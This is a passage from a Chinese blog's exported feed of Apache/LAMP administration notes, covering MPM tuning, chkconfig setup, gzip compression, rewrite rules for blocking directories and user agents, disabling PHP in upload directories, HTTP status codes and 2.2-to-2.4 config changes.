&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;（MaxClients是这些指令中最为重要的一个，设定的是 Apache可以同时处理的请求，是对Apache性能影响最大的参数。其缺省值150是远远不够的，如果请求总数已达到这个值（可通过ps -ef|grep http|wc -l来确认），那么后面的请求就要排队，直到某个已处理请求完毕。这就是系统资源还剩下很多而HTTP访问却很慢的主要原因。虽然理论上这个值越大，可以 处理的请求就越多，但Apache默认的限制不能大于256。） 123456789# worker MPM &lt;IfModule mpm_worker_module&gt;StartServers 3MinSpareThreads 75MaxSpareThreads 250 ThreadsPerChild 25MaxRequestWorkers 400MaxConnectionsPerChild 0&lt;/IfModule&gt; StartServers: 初始数量的服务器进程开始 MinSpareThreads: 最小数量的工作线程,保存备用 MaxSpareThreads: 最大数量的工作线程,保存备用 ThreadsPerChild: 固定数量的工作线程在每个服务器进程 MaxRequestWorkers: 最大数量的工作线程 MaxConnectionsPerChild: 最大连接数的一个服务器进程服务 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Worker 由主控制进程生成“StartServers”个子进程，每个子进程中包含固定的ThreadsPerChild线程数，各个线程独立地处理请求。同样， 为了不在请求到来时再生成线程，MinSpareThreads和MaxSpareThreads设置了最少和最多的空闲线程数； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;而MaxRequestWorkers 设置了同时连入的clients最大总数。如果现有子进程中的线程总数不能满足负载，控制进程将派生新的子进程 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MinSpareThreads和 MaxSpareThreads的最大缺省值分别是75和250。这两个参数对Apache的性能影响并不大，可以按照实际情况相应调节 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ThreadsPerChild是worker MPM中与性能相关最密切的指令。ThreadsPerChild的最大缺省值是64，如果负载较大，64也是不够的。这时要显式使用 ThreadLimit指令，它的最大缺省值是20000。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Worker模式下所能同时处理的请求总数是由子进程总数乘以ThreadsPerChild 值决定的，应该大于等于MaxRequestWorkers。如果负载很大，现有的子进程数不能满足时，控制进程会派生新的子进程。默认最大的子进程总数是16，加大时 也需要显式声明ServerLimit（最大值是20000）。需要注意的是，如果显式声明了ServerLimit，那么它乘以 ThreadsPerChild的值必须大于等于MaxRequestWorkers，而且MaxRequestWorkers必须是ThreadsPerChild的整数倍，否则 Apache将会自动调节到一个相应值。 123456789# event MPM&lt;IfModule mpm_event_module&gt;StartServers 3MinSpareThreads 75MaxSpareThreads 250ThreadsPerChild 25MaxRequestWorkers 400MaxConnectionsPerChild 0&lt;/IfModule&gt; StartServers:初始数量的服务器进程开始 MinSpareThreads: 最小数量的工作线程,保存备用 MaxSpareThreads: 最大数量的工作线程,保存备用 ThreadsPerChild: 固定数量的工作线程在每个服务器进程 MaxRequestWorkers: 最大数量的工作线程 MaxConnectionsPerChild: 最大连接数的一个服务器进程服务]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache加入chkconfig]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F6.%20apache%E5%8A%A0%E5%85%A5chkconfig%2F</url>
    <content type="text"><![CDATA[apache加入chkconfig&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第一步： 1cp /usr/local/apache2/bin/apachectl /etc/init.d/httpd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第二步： 1vim /etc/init.d/httpd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在第一行#!/bin/sh下增加两行文字 12# chkconfig: 35 70 30# description: Apache &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存退出 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第三步： 1chkconfig --level 35 httpd on]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache 开启压缩功能]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F57.%20apache%20%E5%BC%80%E5%90%AF%E5%8E%8B%E7%BC%A9%E5%8A%9F%E8%83%BD%2F</url>
    <content type="text"><![CDATA[apache 开启压缩功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里的压缩并不是对网站的图片压缩，而是对普通的静态文件，诸如html, js, css 等元素压缩。不要小看这个压缩功能，如果一个网站的请求量很大的话，这样可以节省海量带宽，在我国带宽资源非常昂贵，所以小小的一个压缩功能可以为企业节省不少的成本呢！下面就来看看如何配置它？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，需要看一下我们的apache是否支持压缩功能。 1[root@lamp ~]# /usr/local/apache2/bin/apachectl -l &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;看看是否有mod_deflate 1234567891011121314151617181920212223242526272829[root@lamp ~]# /usr/local/apache2/bin/apachectl -lCompiled in modules:core.cmod_authn_file.cmod_authn_default.cmod_authz_host.cmod_authz_groupfile.cmod_authz_user.cmod_authz_default.cmod_auth_basic.cmod_include.cmod_filter.cmod_log_config.cmod_env.cmod_setenvif.cmod_version.cprefork.chttp_core.cmod_mime.cmod_status.cmod_autoindex.cmod_asis.cmod_cgi.cmod_negotiation.cmod_dir.cmod_actions.cmod_userdir.cmod_alias.cmod_so.c &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果这里没有，那继续看一下。下面有没有 mod_deflate.so 这个文件 12[root@lamp ~]# ls /usr/local/apache2/modules/httpd.exp libphp5.so mod_deflate.so mod_expires.so mod_rewrite.so &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果这里也没有，那说明你的apache不支持压缩，需要重编译一下，或者扩展形式安装，或者重新编译apache, 需要在编译的时候，加上 --enable-deflate=shared &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;好，如果你的apache有了deflate这个模块支持，也就支持了压缩功能。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面该配置httpd.conf 了。 1[root@lamp ~]# vim /usr/local/apache2/conf/httpd.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在httpd.conf 中增加 ： 1LoadModule deflate_module modules/mod_deflate.so &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后再增加如下配置： 123456789101112131415&lt;ifmodule mod_deflate.c&gt;DeflateCompressionLevel 6 #6是压缩级别，可以选择1-9AddOutputFilterByType DEFLATE text/plainAddOutputFilterByType DEFLATE text/htmlAddOutputFilterByType DEFLATE text/xmlAddOutputFilterByType DEFLATE text/cssAddOutputFilterByType DEFLATE text/JavaScriptAddOutputFilterByType DEFLATE application/xhtml+xmlAddOutputFilterByType DEFLATE application/xmlAddOutputFilterByType DEFLATE application/rss+xmlAddOutputFilterByType DEFLATE application/atom_xmlAddOutputFilterByType DEFLATE application/x-javascriptAddOutputFilterByType DEFLATE application/x-httpd-PHPAddOutputFilterByType DEFLATE image/svg+xml&lt;ifmodule&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为什么要指定文件类型来压缩？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;答：压缩也是要消耗cpu资源的，图片/视频等文件，压缩效果也不好，一般压缩文本格式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外上述代码也可以根据实际情况删减。]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache 限制某些目录不能访问通过rewrite实现]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F59.%20apache%20%E9%99%90%E5%88%B6%E6%9F%90%E4%BA%9B%E7%9B%AE%E5%BD%95%E4%B8%8D%E8%83%BD%E8%AE%BF%E9%97%AE%E9%80%9A%E8%BF%87rewrite%E5%AE%9E%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[apache 限制某些目录不能访问通过rewrite实现&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;deny allow肯定是可以实现的，但是这个必须指定准确的目录，如果有很多个目录，但是都包含某个名字，比如 1234567bbs.1.com/1/tmp/123.htmlbbs.1.com/2/tmp/123.htmlbbs.1.com/3/1/2/tmp/123.html…… &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果有很多，需要逐一去定义Directory 模块，这显然很麻烦，使用rewrite模块的 REQUEST_URI 就可以很容易实现。 123RewriteEngine onRewriteCond %&#123;REQUEST_URI&#125; ^.*/tmp/* [NC]RewriteRule .* - [F]]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache rewrite 出现死循环]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F56.%20apache%20rewrite%20%E5%87%BA%E7%8E%B0%E6%AD%BB%E5%BE%AA%E7%8E%AF%2F</url>
    <content type="text"><![CDATA[apache rewrite 出现死循环&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我的一条规则 1RewriteRule ^(.*) /111/$1 [R,L] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用curl测试，没有问题，但是使用浏览器访问时，出现了无限循环。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;本来访问的是 www.111.com 结果变成了 www.111.com/111/111/111/….. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;虽然在最后加了 [L] 依然不管用，可能apache还是不够智能，一直满足条件就一直去匹配，一直去跳转。最后没招了只能再加一个条件。 12RewriteCond %&#123;REQUEST_URI&#125; !^/111RewriteRule ^(.*) /111/$1 [R,L] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就不再循环了。]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache 通过 rewrite 限制某个目录]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F54.%20apache%20%E9%80%9A%E8%BF%87%20rewrite%20%E9%99%90%E5%88%B6%E6%9F%90%E4%B8%AA%E7%9B%AE%E5%BD%95%2F</url>
    <content type="text"><![CDATA[apache 通过 rewrite 限制某个目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;allow 和 deny 可以去限制网站根目录下的某个子目录， rewrite 也可以实现，配置如下： 12345678[root@lamp ~]# vim /usr/local/apache2/conf/extra/httpd-vhosts.conf&lt;IfModule mod_rewrite.c&gt; RewriteEngine on RewriteCond %&#123;REQUEST_URI&#125; ^.*/tmp/* [NC] RewriteRule .* - [F]&lt;/IfModule&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这段配置，会把只要是包含 /tmp/ 字样的请求都限制了。]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache的rewrite规则]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F58.%20apache%E7%9A%84rewrite%E8%A7%84%E5%88%99%2F</url>
    <content type="text"><![CDATA[apache的rewrite规则&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rewrite的规则： 12345678910111213&lt;IfModule mod_rewrite.c&gt; RewriteEngine on RewriteCond %&#123;HTTP_USER_AGENT&#125; ^.*Firefox/4.0* [NC,OR] RewriteCond %&#123;HTTP_USER_AGENT&#125; ^.*Tomato Bot/1.0* [NC] RewriteCond %&#123;REQUEST_URI&#125; !^/404* RewriteRule .* /404.html &lt;/IfModule&gt; &lt;IfModule mod_rewrite.c&gt; RewriteEngine on RewriteCond %&#123;HTTP_USER_AGENT&#125; ^*Firefox/4.0* [NC,OR] RewriteCond %&#123;HTTP_USER_AGENT&#125; ^*Tomato Bot/1.0* [NC] RewriteRule .* - [F] &lt;/IfModule&gt; RewriteEngine on #打开rewirte功能 RewriteCond %{变量} 正则 [标志] RewriteRule 正则1 正则2 正则1一般是从www.*.com/这个以后开始的 - [F]: 这里的-表示替换 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;标志： R=301 强制外部重定向强制在替代字符串加上http://thishost[:thisport]/前缀重定向到外部的URL.如果code不指定，将用缺省的302 HTTP状态码。 [F]禁用URL,返回403HTTP状态码。30 G 强制URL为GONE，返回410HTTP状态码。 P 强制使用代理转发。 L 表明当前规则是最后一条规则，停止分析以后规则的重写。 N 重新从第一条规则开始运行重写过程。 C 与下一条规则关联 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果规则匹配则正常处理，该标志无效，如果不匹配，那么下面所有关联的规则都跳过。 [T]=MIME-type(force MIME type) [NS] (used only if no internal sub-request) 只用于不是内部子请求 NC 不区分大小写 QSA 追加请求字符串 NE 不在输出转义特殊字符 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如：RewriteRule /foo/(.*) /bar?arg=P1\%3d$1 [R,NE] 将能正确的将/foo/zoo转换成/bar?arg=P1=zed PT 传递给下一个处理 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如： 12RewriteRule ^/abc(.*) /def$1 [PT] # 将会交给/def规则处理 Alias /def /ghi S=num) 跳过num条规则 E=VAR:VAL 设置环境变量 [OR] 或者 两个RewriteCond 之间什么都不写就是 且 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;变量： %{HTTP_USER_AGENT} 表示：访问的user_agent %{HTTP_HOST} 表示：当前访问的网址，只是指前缀部分，格式是www.xxx.com不包括“http://”和“/” %{REQUEST_URI} 表示：表示访问的相对地址，就是相对根目录的地址，就是域名/后面的成分，格式上包括最前面的“/”， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;www.123.com/xiang/1.html &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;RewriteRule: 1RewriteRule ^/(.*)$ http://www.123.com/$1 [R=301,L]]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache限制某个目录下的php文件没有执行权限]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F51.%20apache%E9%99%90%E5%88%B6%E6%9F%90%E4%B8%AA%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84php%E6%96%87%E4%BB%B6%E6%B2%A1%E6%9C%89%E6%89%A7%E8%A1%8C%E6%9D%83%E9%99%90%2F</url>
    <content type="text"><![CDATA[apache限制某个目录下的php文件没有执行权限&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为了安全期间，有时我们需要限制网站下的某些目录对于php脚本不能执行。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有两种方法可以参考： 使用.htaccess 文件限制 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在要限制php执行的目录下，创建.htaccess文件，加入内容 1php_flag engine off 使用apache的配置文件httpd.conf在相关的虚拟主机段，加入 12345678&lt;Directory /data/www/data/&gt; php_admin_flag engine off &lt;filesmatch "(.*)php"&gt; Order deny,allow Deny from all Allow from 127.0.0.1 &lt;/filesmatch&gt;&lt;/Directory&gt;]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache 禁止指定 user_agent]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F53.%20apache%20%E7%A6%81%E6%AD%A2%E6%8C%87%E5%AE%9A%20user_agent%2F</url>
    <content type="text"><![CDATA[apache 禁止指定 user_agent&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;user_agent 把它叫做浏览器标识，目前主流的浏览器有 IE、chrome、firefox、360、iphone上的 safari、android手机上的 百度搜索引擎、google搜索引擎等很多，每一种浏览器都有对应的 user_agent 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;常见 user_agent Opera Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60 Opera/8.0 (Windows NT 5.1; U; en) Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.50 Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.50 Firefox Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0 Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10 Safari Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2 chrome Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11 Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16 360 Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36 Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面针对这些 user_agent 来做一些限制。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置如下： 123456789[root@lamp ~]# vim /usr/local/apache2/conf/extra/httpd-vhosts.conf&lt;IfModule mod_rewrite.c&gt; RewriteEngine on RewriteCond %&#123;HTTP_USER_AGENT&#125; ^.*curl.* [NC,OR] RewriteCond %&#123;HTTP_USER_AGENT&#125; ^.*chrome* [NC] RewriteRule .* - [F]&lt;/IfModule&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;同样是使用 rewrite 模块来实现限制指定 user_agent ，在上例中， RewriteRule . -[F] 可以直接禁止访问， rewritecond 用 user_agent 来匹配，curl 表示，只要 user_agent 中含有 curl 就符合条件，其中 表示任意字符， NC 表示不区分大小写，OR 表示或者，连接下一个以条件。这样就把 curl 和 chrome 浏览器禁止掉了。假如现在要把百度的搜索引擎限制掉，可以加这样一条规则： 12RewriteCond %&#123;HTTP_USER_AGENT&#125; ^*Baiduspider/2.0* [NC] RewriteRule .* - [F] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;既然后了或者 OR，那有没有并且呢。只要不写 OR 就是并且的意思]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache 限制指定user_agent]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F50.%20apache%20%E9%99%90%E5%88%B6%E6%8C%87%E5%AE%9Auser_agent%2F</url>
    <content type="text"><![CDATA[apache 限制指定user_agent&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有些user_agent 不是我们想要的，可以通过rewrite功能针对 %{HTTP_USER_AGENT} 来rewirete到404页，从而达到限制某些user_agent的请求。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置如下 12345RewriteEngine onRewriteCond %&#123;HTTP_USER_AGENT&#125; ^.*Firefox/4.0* [NC,OR]RewriteCond %&#123;HTTP_USER_AGENT&#125; ^.*Tomato Bot/1.0* [NC]RewriteCond %&#123;REQUEST_URI&#125; !^/404*RewriteRule .* /404.html &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;请注意，404.html千万别再跳转到其他页面了，否则很有可能就会死循环了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其实rewrite到404.html 并不是很好的办法，而apache的rewrite功能有一项就是forbidden ,那就是 F &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置如下 1234RewriteEngine onRewriteCond %&#123;HTTP_USER_AGENT&#125; ^*Firefox/4.0* [NC,OR]RewriteCond %&#123;HTTP_USER_AGENT&#125; ^*Tomato Bot/1.0* [NC]RewriteRule .* - [F]]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[http协议的状态码—400,401,403,404,500,502,503,301,302等常见网页错误代码]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F52.%20http%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%8A%B6%E6%80%81%E7%A0%81%E2%80%94400%2C401%2C403%2C404%2C500%2C502%2C503%2C301%2C302%E7%AD%89%E5%B8%B8%E8%A7%81%E7%BD%91%E9%A1%B5%E9%94%99%E8%AF%AF%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[http协议的状态码—400,401,403,404,500,502,503,301,302等常见网页错误代码http协议的状态码1xx（临时响应）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;表示临时响应并需要请求者继续执行操作的状态码。 状态码 注释 100（继续） 请求者应当继续提出请求。服务器返回此代码表示已收到请求的第一部分，正在等待其余部分。 101（切换协议） 请求者已要求服务器切换协议，服务器已确认并准备切换。 2xx（成功）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;表示成功处理了请求的状态码。 状态码 注释 200（成功） 服务器已成功处理了请求。通常，这表示服务器提供了请求的网页。 201（已创建） 请求成功并且服务器创建了新的资源。 202（已接受） 服务器已接受请求，但尚未处理。 203（非授权信息） 服务器已成功处理了请求，但返回的信息可能来自另一来源。 204（无内容） 服务器成功处理了请求，但没有返回任何内容。 205（重置内容） 服务器成功处理了请求，但没有返回任何内容。 206（部分内容） 服务器成功处理了部分 GET 请求。 3xx（重定向）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要完成请求，需要进一步操作。通常，这些状态码用来重定向。Google 建议您在每次请求中使用重定向不要超过 5 次。您可以使用网站管理员工具查看一下 Googlebot 在抓取重定向网页时是否遇到问题。诊断下的网络抓取页列出了由于重定向错误导致 Googlebot 无法抓取的网址。 状态码 注释 300（多种选择） 针对请求，服务器可执行多种操作。服务器可根据请求者 (user agent) 选择一项操作，或提供操作列表供请求者选择。 301（永久移动） 请求的网页已永久移动到新位置。服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置。 302（临时移动） 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来响应以后的请求。 303（查看其他位置） 请求者应当对不同的位置使用单独的 GET 请求来检索响应时，服务器返回此代码。 304（未修改） 自从上次请求后，请求的网页未修改过。服务器返回此响应时，不会返回网页内容。 305（使用代理） 请求者只能使用代理访问请求的网页。如果服务器返回此响应，还表示请求者应使用代理。 307（临时重定向） 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来响应以后的请求。 4xx（请求错误）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这些状态码表示请求可能出错，妨碍了服务器的处理。 状态码 注释 400（错误请求） 服务器不理解请求的语法。 401（未授权） 请求要求身份验证。对于登录后请求的网页，服务器可能返回此响应。 403（禁止） 服务器拒绝请求。 404（未找到） 服务器找不到请求的网页。 405（方法禁用） 禁用请求中指定的方法。 406（不接受） 无法使用请求的内容特性响应请求的网页。 407（需要代理授权） 此状态码与 401（未授权）类似，但指定请求者应当授权使用代理。 408（请求超时） 服务器等候请求时发生超时。 409（冲突） 服务器在完成请求时发生冲突。服务器必须在响应中包含有关冲突的信息。 410（已删除） 如果请求的资源已永久删除，服务器就会返回此响应。 411（需要有效长度） 服务器不接受不含有效内容长度标头字段的请求。 412（未满足前提条件） 服务器未满足请求者在请求中设置的其中一个前提条件。 413（请求实体过大） 服务器无法处理请求，因为请求实体过大，超出服务器的处理能力。 414（请求的 URI 过长） 请求的 URI（通常为网址）过长，服务器无法处理。 415（不支持的媒体类型） 请求的格式不受请求页面的支持。 416（请求范围不符合要求） 如果页面无法提供请求的范围，则服务器会返回此状态码。 417（未满足期望值） 服务器未满足”期望”请求标头字段的要求。 5xx（服务器错误）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这些状态码表示服务器在处理请求时发生内部错误。这些错误可能是服务器本身的错误，而不是请求出错。 状态码 注释 500（服务器内部错误） 服务器遇到错误，无法完成请求。 501（尚未实施） 服务器不具备完成请求的功能。例如，服务器无法识别请求方法时可能会返回此代码。 502（错误网关） 服务器作为网关或代理，从上游服务器收到无效响应。 503（服务不可用） 服务器目前无法使用（由于超载或停机维护）。通常，这只是暂时状态。 504（网关超时） 服务器作为网关或代理，但是没有及时从上游服务器收到请求。 505（HTTP 版本不受支持） 服务器不支持请求中所用的 HTTP 协议版本。]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[rewirete规则不生效]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F55.%20rewirete%E8%A7%84%E5%88%99%E4%B8%8D%E7%94%9F%E6%95%88%2F</url>
    <content type="text"><![CDATA[%{REQUEST_FILENAME} -f 不生效&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在虚拟主机中，配置了rewirete规则 12RewriteCond %&#123;REQUEST_FILENAME&#125; !-fRewriteRule !\.(js|ico|gif|jpg|png|css|xml|swf)$ /index.php &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;测试N遍一直不生效。google了好久，发现一篇文章说是如果在虚拟主机配置 %{REQUEST_FILENAME} 时，需要配置绝对路劲，相对路径是不识别的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;于是，改成如下配置 12RewriteCond %&#123;DOCUMENT_ROOT&#125;%&#123;REQUEST_FILENAME&#125; !-fRewriteRule !\.(js|ico|gif|jpg|png|css|xml|swf)$ /index.php &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;成功实现rewrite 规则。]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[针对访问uri 限制ip]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F48.%20%E9%92%88%E5%AF%B9%E8%AE%BF%E9%97%AEuri%20%E9%99%90%E5%88%B6ip%2F</url>
    <content type="text"><![CDATA[针对访问uri 限制ip&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在虚拟主机配置文件中加入如下字段： 1234Order deny,allowDeny from allAllow from 127.0.0.1Allow from 2.2.2.2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;假如该虚拟机的域名为 domain.com , 这样配置后，除了 127.0.0.1 和 2.2.2.2 外，其他ip访问以下类似的uri时都会直接禁止的。 http://domain.com/1212admin.txt http://domain.com/admin.php http://domain.com/1212/admin.html 等等。]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache 禁止解析 php]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F49.%20apache%20%E7%A6%81%E6%AD%A2%E8%A7%A3%E6%9E%90%20php%2F</url>
    <content type="text"><![CDATA[apache 禁止解析 php&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;某个目录下禁止解析 php ，这个很有用，做网站安全的时候，这个用得很多，比如某些目录可以上传文件，为了避免上传的文件有木马，所以我们禁止这个目录下面的访问解析 php。 12345678910[root@lamp ~]# vim /usr/local/apache2/conf/extra/httpd-vhosts.conf&lt;Directory /data/www/data/&gt; php_admin_flag engine off &lt;filesmatch "(.*)php"&gt; Order deny,allow Deny from all Allow from 127.0.0.1 &lt;/filesmatch&gt;&lt;/Directory&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： php_admin_flag engine off 这个语句就是禁止解析 php 的控制语句，但只这样配置还不够，因为这样配置后用户依然可以访问 php 文件，只不过不解析了，但可以下载，用户下载 php 文件也是不合适的，所以有必要再禁止一下。]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache2.2 到 2.4后配置文件需要更改的部分]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F44.%20apache2.2%20%E5%88%B0%202.4%E5%90%8E%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E9%9C%80%E8%A6%81%E6%9B%B4%E6%94%B9%E7%9A%84%E9%83%A8%E5%88%86%2F</url>
    <content type="text"><![CDATA[apache2.2 到 2.4后配置文件需要更改的部分 访问控制 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2.2 的时候 12Order deny,allowDeny from all &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 2.4 需要改成 1Require all denied &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;常用的配置有： 12345Require all denied Require all granted Require host xxx.com Require ip 192.168.1 192.168.2 Require local RewriteLogLevel 变为：logLevel &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如，LogLevel warn rewrite: warn Namevirtualhost 被移除 网站压缩，除了使用mod_deflate，还要mod_filter &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用ssl，除了使用mod_ssl，还需要mod_socache_shmcb]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache 访问控制]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F42.%20apache%20%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%2F</url>
